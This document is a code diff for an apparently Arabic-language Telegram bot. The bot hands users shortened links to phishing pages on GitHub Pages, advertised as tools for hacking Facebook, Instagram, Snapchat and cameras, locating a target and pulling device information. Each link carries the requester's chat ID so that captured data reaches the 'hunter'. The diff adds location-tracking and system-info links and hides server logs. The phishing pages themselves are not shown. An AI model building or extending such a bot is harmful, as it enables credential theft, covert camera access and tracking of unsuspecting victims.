@@ -3,8 +3,12 @@ import requests
 from flask import Flask
 from threading import Thread
 import os
+import logging
 
-# --- نظام الـ Keep Alive لضمان استمرار البوت 24 ساعة ---
+# 1. كتم التنبيهات الحمراء عشان اللوغز يضل نظيف
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
 app = Flask('')
 
 @app.route('/')
@@ -35,30 +39,38 @@ def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
     hunter = first_name.replace(" ", "_")
+    
+    # رابط استضافتك الأساسي (تأكد إنه رابط الـ Pages تبعك)
     base = "https://m-y-9-tech.github.io/fb/"
     
-    fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
-    ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
-    snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
-    cam = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
+    # توليد الروابط مع ID واسم الصياد بالملي
+    links = {
+        "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}"),
+        "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}"),
+        "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}"),
+        "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}"),
+        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}"),
+        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
+    }
 
     msg = f"""
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
-⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
-لـ^ـضـ^ـمـ^ـان تـ^ـفـ^ـعـ^ـيـ^ـل الأوامـر، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور:
+⚠️ لـ^ـضـ^ـمـان تـ^ـفـ^ـعـ^ـيـل الأدوات، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور:
 🔴 https://www.instagram.com/m_y_.9/
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb}`
-🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig}`
-🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap}`
-🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{cam}`
+🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{links['fb']}`
+🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{links['ig']}`
+🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
+🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
+🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع 📍: `{links['loc']}`
+🔹 سـ^ـحـ^ـب المـ^ـعـ^ـلـ^ـومـ^ـات 📱: `{links['sys']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
@@ -67,4 +79,5 @@ def send_welcome(message):
 
 if __name__ == "__main__":
     keep_alive()
+    print("🚀 M.Y.9 System Started Successfully!")
     bot.infinity_polling()
